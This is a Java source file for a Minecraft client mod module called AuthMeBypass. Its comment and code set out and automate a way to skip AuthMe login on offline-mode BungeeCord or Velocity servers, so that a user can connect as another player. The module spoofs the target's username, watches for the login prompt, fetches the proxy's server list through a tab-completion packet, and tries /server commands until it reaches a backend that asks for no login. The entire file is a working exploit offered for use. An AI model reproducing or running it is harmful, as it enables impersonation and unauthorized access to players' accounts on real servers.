package com.claudemc.module.impl.misc;

import com.claudemc.ClaudeMCMod;
import com.claudemc.module.Category;
import com.claudemc.module.Module;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * AuthMeBypass — exploits the BungeeCord proxy command-processing order to
 * skip AuthMe authentication on cracked servers.
 *
 * How the bypass works:
 *   BungeeCord (and most proxy software) processes /server before forwarding
 *   the packet to the backend Spigot/Paper server. AuthMe runs on the backend
 *   only — so during the login phase the proxy still accepts /server.
 *
 *   1. Set your account username to the target player (AltManager → Offline).
 *   2. Connect to the target server. BungeeCord routes you to the lobby/auth
 *      server where AuthMe presents a /login prompt.
 *   3. This module detects the prompt and immediately sends /server <backend>
 *      through the proxy before AuthMe can act on anything.
 *   4. The proxy transfers you to a backend sub-server that has no auth
 *      requirement. You are now connected as the target username.
 *
 * Server discovery:
 *   First sends a /server<TAB> RequestCommandCompletionsC2SPacket — the proxy
 *   typically responds with the full server list. If no completions arrive
 *   within 2 seconds, falls back to common sub-server names.
 *
 * Limitations:
 *   - Requires the target server to be running a BungeeCord/Waterfall proxy
 *     with offline/cracked mode enabled.
 *   - Velocity with its forwarding secret rejects direct backend connections,
 *     but the /server bypass still works if the proxy itself is Velocity-based
 *     (Velocity also processes /server at the proxy layer).
 *   - Does NOT work if the server uses BungeeGuard or IP-whitelist on the
 *     backend, as those require a matching forwarding secret.
 */
public class AuthMeBypass extends Module {

    public static AuthMeBypass INSTANCE;

    private static final int TAB_ID = 47; // arbitrary, just needs to be consistent

    private static final String[] COMMON_SERVERS = {
        "hub", "lobby", "survival", "main", "creative", "skyblock",
        "factions", "prison", "practice", "pvp", "kitpvp",
        "bedwars", "skywars", "games", "minigames", "build", "plots",
        "earth", "vanilla", "smp", "anarchy"
    };

    private enum Phase { IDLE, DELAY, PROBE, TRYING, DONE }

    private Phase  phase      = Phase.IDLE;
    private int    timer      = 0;
    private int    tryIdx     = 0;
    private int    joinsSeen  = 0;
    private final List<String> discoveredServers = new ArrayList<>();

    public AuthMeBypass() {
        super("AuthMeBypass",
              "Bypasses AuthMe on cracked BungeeCord servers — jumps to a backend via proxy /server before auth completes",
              Category.MISC);
        addBool("AutoTrigger", true);
        addNumber("DelayTicks", 10, 1, 60, 1, true);
        addNumber("RetryTicks", 30, 10, 100, 5, true);
        INSTANCE = this;

        // Detect AuthMe /login or /register prompts
        ClientReceiveMessageEvents.GAME.register((msg, overlay) -> {
            if (!isEnabled() || !getBool("AutoTrigger")) return;
            if (phase != Phase.IDLE) return;
            if (isAuthPrompt(msg.getString().toLowerCase())) {
                phase = Phase.DELAY;
                timer = getInt("DelayTicks", 10);
                msg("§6Auth prompt detected — probing proxy for server list…");
                ClaudeMCMod.LOGGER.info("[AuthMeBypass] Auth prompt detected, starting bypass.");
            }
        });

        // A second JOIN event means we successfully switched to a backend server
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            if (!isEnabled()) return;
            joinsSeen++;
            if (joinsSeen > 1) {
                phase = Phase.DONE;
                msg("§aBypass successful — authenticated as " +
                    (client.player != null ? client.player.getName().getString() : "target") +
                    " on backend server.");
                ClaudeMCMod.LOGGER.info("[AuthMeBypass] Server switch detected — bypass complete.");
            }
        });

        ClientPlayConnectionEvents.DISCONNECT.register((h, c) -> reset());
    }

    /** Called by ClientPlayNetworkHandlerMixin when the proxy responds to our tab-complete request. */
    public void onTabCompletions(int transactionId, List<String> names) {
        if (transactionId != TAB_ID || phase != Phase.PROBE) return;
        discoveredServers.clear();
        for (String n : names) {
            String t = n.trim();
            if (!t.isBlank()) discoveredServers.add(t);
        }
        if (!discoveredServers.isEmpty()) {
            msg("§7Proxy listed §f" + discoveredServers.size() + "§7 server(s): §f" +
                String.join("§7, §f", discoveredServers));
        }
        phase = Phase.TRYING;
        timer = 0;
        tryIdx = 0;
    }

    @Override
    public void onEnable() {
        reset();
        joinsSeen = 0;
    }

    @Override
    public void onDisable() {
        reset();
    }

    @Override
    public void onTick(MinecraftClient client) {
        if (client.player == null || client.getNetworkHandler() == null) return;

        switch (phase) {

            case IDLE -> {}

            case DELAY -> {
                if (--timer > 0) return;
                // Request tab completions for /server from the proxy
                client.getNetworkHandler().sendPacket(
                    new RequestCommandCompletionsC2SPacket(TAB_ID, "/server "));
                timer = 40; // wait up to 2 s for proxy to respond
                phase = Phase.PROBE;
            }

            case PROBE -> {
                // Waiting for onTabCompletions() callback from mixin.
                // If ticks run out, proceed with common fallback names.
                if (--timer > 0) return;
                if (discoveredServers.isEmpty())
                    msg("§7No completions received — trying common server names…");
                phase = Phase.TRYING;
                tryIdx = 0;
                timer = 0;
            }

            case TRYING -> {
                if (--timer > 0) return;
                List<String> list = discoveredServers.isEmpty()
                    ? Arrays.asList(COMMON_SERVERS) : discoveredServers;

                if (tryIdx >= list.size()) {
                    msg("§cAll server names exhausted — bypass failed.");
                    ClaudeMCMod.LOGGER.info("[AuthMeBypass] Exhausted {} server name(s).", list.size());
                    phase = Phase.IDLE;
                    return;
                }

                String srv = list.get(tryIdx++);
                client.getNetworkHandler().sendChatCommand("server " + srv);
                msg("§7Trying §f/server " + srv + " §8(" + tryIdx + "/" + list.size() + ")");
                timer = getInt("RetryTicks", 30);
            }

            case DONE -> setEnabled(false);
        }
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private boolean isAuthPrompt(String s) {
        return s.contains("/login") || s.contains("/register")
            || s.contains("please login")   || s.contains("please register")
            || s.contains("log in to play") || s.contains("register to play")
            || s.contains("not registered") || s.contains("type /login")
            || s.contains("type /register") || s.contains("you need to login")
            || s.contains("you need to register") || s.contains("authme");
    }

    private void msg(String text) {
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.player != null)
            mc.player.sendMessage(Text.literal("§b[AuthMeBypass] §7" + text), false);
    }

    private void reset() {
        phase = Phase.IDLE;
        timer = 0;
        tryIdx = 0;
        discoveredServers.clear();
    }

    private boolean getBool(String name) {
        return Boolean.parseBoolean(getSetting(name));
    }

    private int getInt(String name, int def) {
        try { return Integer.parseInt(getSetting(name).trim()); } catch (Exception e) { return def; }
    }
}
